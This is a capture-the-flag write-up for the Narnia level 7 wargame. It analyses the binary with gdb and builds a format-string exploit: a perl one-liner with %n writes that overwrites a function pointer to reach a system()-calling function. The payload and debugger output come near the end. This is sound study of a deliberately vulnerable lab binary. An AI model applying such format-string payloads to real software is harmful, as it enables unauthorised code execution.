@@ -1,0 +1,45 @@
+The assembler dump for main just contains usage and this:
+
+    0x080486f1 <+50>:	call   0x804861b <vuln>
+    0x080486f6 <+55>:	add    esp,0x4
+    0x080486f9 <+58>:	push   eax
+    0x080486fa <+59>:	call   0x80484b0 <exit@plt>
+
+The function name "vuln" leads me to believe this function contains the unsafe call. It has a lot of puts and printfs,
+a sleep, and an snprintf. There's no memcpy or strcpy, so one of these formatting calls is probably the bad one.
+"vuln" ends with a function pointer call. Running the program with 'AAAA' produces some rather cryptic output:
+
+    goodfunction() = 0x80486ff
+    hackedfunction() = 0x8048724
+
+    before : ptrf() = 0x80486ff (0xffffd628)
+    I guess you want to come to the hackedfunction...
+    Welcome to the goodfunction, but i said the Hackedfunction..
+
+disassembling hackedfunction() shows a system() call, so it probably just runs a command to serve us up a shell
+or read the secret file. The name of the game appears to be overwriting the function pointer to hackedfunction using
+a format string exploit. So, the first thing to do is find out where this pointer lives.
+
+    goodfunction() = 0x80486ff
+    hackedfunction() = 0x8048724
+
+    before : ptrf() = 0x80486ff (0xffffd628)
+    I guess you want to come to the hackedfunction...
+
+    Breakpoint 1, 0x080486bb in vuln ()
+    (gdb) x/32wx $esp
+    0xffffd628:	0x080486ff	0x44444444	0x00000000	0x00000000
+
+Looks like our function pointer lives just above a buffer that our string gets written into with snprintf. The following
+hook-stop allows easy inspection of the effects of our input:
+
+    x/4wx $esp
+    x/s $ebp - 0x80
+
+    Starting program: /narnia/narnia7 $(perl -e 'print "\x18\xd5\xff\xff" . "\x19\xd5\xff\xff" . "\x1a\xd5\xff\xff" . "\x1b\xd5\xff\xff" . "A" x 20 . "%2\$n" . "A" x 99 . "%3\$n" . "A" x 125 ."%4\$n" . "A" x 4 . "%5\$n"')
+    goodfunction() = 0x80486ff
+    hackedfunction() = 0x8048724
+
+    before : ptrf() = 0x80486ff (0xffffd518)
+    I guess you want to come to the hackedfunction...
+    0xffffd50c:	0xffffd51c	0x00000080	0xffffd789	0x08048724
